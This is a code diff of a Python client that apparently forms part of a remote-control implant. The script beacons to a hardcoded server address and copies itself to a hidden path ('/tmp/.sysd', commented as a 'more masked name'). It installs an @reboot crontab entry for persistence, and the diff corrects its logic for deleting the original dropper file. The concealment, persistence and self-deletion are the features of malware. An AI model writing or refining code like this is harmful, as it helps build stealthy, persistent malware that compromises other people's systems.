@@ -8,7 +8,7 @@ import os
 import subprocess
 import sys
 
-SERVER_IP = "192.168.108.137" # IP addr of whatever the server script is running on, this one is from local testing
+SERVER_IP = "192.168.47.54" # IP addr of whatever the server script is running on, this one is from local testing
 INTERVAL = 1
 CLIENT_ID = random.randint(1000, 9999)
 PERSISTENT_PATH = "/tmp/.sysd"  # More masked name
@@ -104,8 +104,8 @@ def setup_persistence():
 
     # delete starting file
     time.sleep(1)
-    if os.path.basename(sys.argv[0]) == "network]":
-        os.unlink(sys.argv[0])  # Only delete if name matches above. This way the persistent file remains
+    if os.path.basename(sys.argv[0]) != ".sysd":
+        os.unlink(sys.argv[0])  # Only delete if it doesnt match this file name. This way the persistent file remains
 
     # cron tab for rebooting
     cron_job = f"@reboot {PERSISTENT_PATH} &"
